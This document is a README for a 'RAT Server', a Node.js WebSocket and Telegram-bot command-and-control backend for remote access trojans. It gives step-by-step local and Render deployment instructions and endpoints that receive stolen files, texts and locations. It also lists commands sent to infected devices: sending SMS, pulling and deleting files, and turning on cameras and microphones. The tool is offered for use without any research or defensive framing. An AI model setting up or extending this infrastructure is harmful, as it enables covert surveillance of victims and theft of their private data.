# RAT Server 🚀

WebSocket server with Telegram Bot integration for remote control functionality.

## Setup Instructions

### Prerequisites
- Node.js 18.x or higher
- npm or yarn
- Telegram Bot Token (from [@BotFather](https://t.me/botfather))
- Telegram Chat ID

### Local Development

1. **Clone the repository:**
```bash
git clone https://github.com/munna1127/rat_server-.git
cd rat_server-
```

2. **Install dependencies:**
```bash
npm install
```

3. **Create `.env` file:**
```bash
cp .env.example .env
```

4. **Update `.env` with your credentials:**
```
TELEGRAM_BOT_TOKEN=your_bot_token_here
TELEGRAM_CHAT_ID=your_chat_id_here
SERVER_ADDR=http://localhost:9000
PORT=9000
NODE_ENV=development
```

5. **Start the server:**
```bash
npm start
```

Server will run on `http://localhost:9000`

---

## 🌐 Deploy on Render

### Step 1: Create Render Account
- Go to [render.com](https://render.com)
- Sign up with GitHub account

### Step 2: Create New Web Service
1. Click **"New +"** button
2. Select **"Web Service"**
3. Choose your **rat_server-** repository
4. Click **"Connect"**

### Step 3: Configure Service
Fill in the following details:

| Field | Value |
|-------|-------|
| **Name** | rat_server |
| **Environment** | Node |
| **Region** | Choose nearest region |
| **Branch** | main |
| **Build Command** | `npm install` |
| **Start Command** | `npm start` |
| **Plan** | Free or Paid |

### Step 4: Add Environment Variables
Go to **"Environment"** tab and add:

```
TELEGRAM_BOT_TOKEN = your_bot_token_here
TELEGRAM_CHAT_ID = your_chat_id_here
SERVER_ADDR = https://rat-server.onrender.com
PORT = 10000
NODE_ENV = production
```

### Step 5: Deploy
- Click **"Create Web Service"**
- Wait for deployment to complete
- Your server URL will be: `https://rat-server.onrender.com`

---

## ⚠️ Important Notes for Render

✅ **What Works:**
- WebSocket connections
- Telegram Bot API
- File uploads/downloads
- HTTP endpoints

⚠️ **Important:**
- Free tier instances **spin down after 15 minutes of inactivity**
- Use a cron job or external monitor to keep it alive
- Render provides **550 free hours/month** for web services
- Your URL will be available 24/7, but inactive instances will sleep

### Keep Server Alive (Optional)
Add a monitor service to prevent sleep:
1. Use [UptimeRobot](https://uptimerobot.com) (Free)
2. Configure to ping: `https://rat-server.onrender.com/`
3. Every 5-10 minutes

---

## 📡 API Endpoints

### Health Check
```
GET /
Response: Welcome
```

### Send File
```
POST /sendFile
Body: Form-data with file
Response: filename
```

### Send Text Message
```
POST /sendText
Body: {"text": "Your message"}
Response: Message text
```

### Send Location
```
POST /sendLocation
Body: {"l1": latitude, "l2": longitude}
Response: Latitude value
```

---

## 🔌 WebSocket Connection

Clients connect via WebSocket:
```
ws://localhost:9000
```

Or on Render:
```
wss://rat-server.onrender.com
```

### Server Sends Commands
- `be alive` - Keep-alive ping
- `send&device_id` - Send SMS
- `gf&file_path` - Get file/folder
- `df&file_path` - Delete file/folder
- `cam1/cam2` - Camera commands
- `mi1/mi2/mi3` - Microphone commands
- `cl/gc/ss/ia/dm/cp` - Other commands

---

## 🤖 Telegram Bot Commands

After connecting to your bot:

| Command | Action |
|---------|--------|
| `/start` | Initialize bot |
| `Status ⚙` | Show connected clients |
| `Action ☄` | Show available actions |

---

## 📝 File Structure

```
rat_server-/
├── server.js          # Main server file
├── package.json       # Dependencies
├── .env.example       # Environment template
├── .gitignore         # Git ignore rules
└── README.md          # This file
```

---

## 🔐 Security Notes

⚠️ **IMPORTANT:**
- Never commit `.env` file to git
- Keep your Telegram Bot Token secret
- Use HTTPS for production (Render provides this)
- Validate all incoming requests

---

## 🆘 Troubleshooting

### Bot not responding?
- Check `TELEGRAM_BOT_TOKEN` in `.env`
- Verify `TELEGRAM_CHAT_ID` is correct
- Ensure bot has admin permissions

### WebSocket connection fails?
- Check if server is running
- Verify firewall allows WebSocket connections
- For Render, use `wss://` instead of `ws://`

### Render instance spinning down?
- Use UptimeRobot or similar service
- Add a cron job to ping the server
- Upgrade to Paid plan (always on)

---

## 📄 License

ISC

---

## 👨‍💻 Author

**l** - Original developer

Modified for Render deployment by **munna1127**

---

## 🚀 Quick Start Commands

```bash
# Clone
git clone https://github.com/munna1127/rat_server-.git && cd rat_server-

# Install
npm install

# Setup
cp .env.example .env

# Edit .env with your tokens

# Run
npm start
```

**Enjoy your RAT Server! 🎉**
